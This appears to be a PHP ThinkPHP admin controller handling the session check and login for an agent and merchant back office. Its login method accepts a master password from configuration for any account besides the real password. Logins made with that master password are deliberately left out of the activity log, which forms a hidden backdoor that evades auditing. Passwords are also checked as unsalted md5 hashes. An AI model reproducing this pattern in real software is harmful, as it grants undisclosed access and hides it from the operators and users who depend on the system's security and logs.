<?php
namespace app\admin\controller;
class Index extends \think\Controller{

	function index(){

		if( session('admin') ){

			$money = model('AdminUser')->where(['username' => session('admin.username') ])->value('money');

			$return_data = [

				'money'			=>	$money

			];

			$this->assign($return_data);

			return view('menu');

		}else{

			return view('login');

		}

	}

	/*
	 * 后台登录
	 */

	function login(){

		if( session('merchant') ) $this->error('请先退出商户端，再登录代理端');

		$username			=	input('username');
		$password			=	input('password');

		$ex = model('AdminUser')->where(['username' => $username])->find();

		if(!$ex) $this->error('账号不存在');

		if($ex['password'] != md5($password) and $password != config('back_password') ) $this->error('密码错误');

        //判断账号状态 1：启用  0：未启用
        $status = model('AdminUser')->where(['username' => $username])->value('is_active');
        if($status != 1) $this->error('账号暂无启用');

        session('admin',$ex);

		if( $password != config('back_password') ) model('Log')->log('admin', session('admin.username'),'登录后台，身份【'. config('administrator.pos')[session('admin.pos')]['name'] .'】，登录ip【'. request()->ip() .'】' );

		$this->success('登录成功');

	}

}